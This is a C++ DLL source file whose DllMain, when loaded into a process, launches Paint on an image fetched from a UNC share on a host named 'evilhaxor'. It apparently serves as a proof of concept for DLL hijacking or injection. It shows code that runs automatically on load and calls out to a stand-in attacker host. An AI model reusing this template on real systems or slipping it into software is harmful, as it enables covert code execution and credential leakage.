// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			STARTUPINFO startupInfo;
			PROCESS_INFORMATION processInfo;

			ZeroMemory(&startupInfo, sizeof(startupInfo));
			startupInfo.cb = sizeof(startupInfo);
			ZeroMemory(&processInfo, sizeof(processInfo));

			TCHAR command[] = "mspaint.exe \\\\evilhaxor\\a\\archer_top_gun.jpg";

			CreateProcess(
				NULL,
				command,
				NULL,
				NULL,
				FALSE,
				0,
				NULL,
				NULL,
				&startupInfo,
				&processInfo);
		}
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

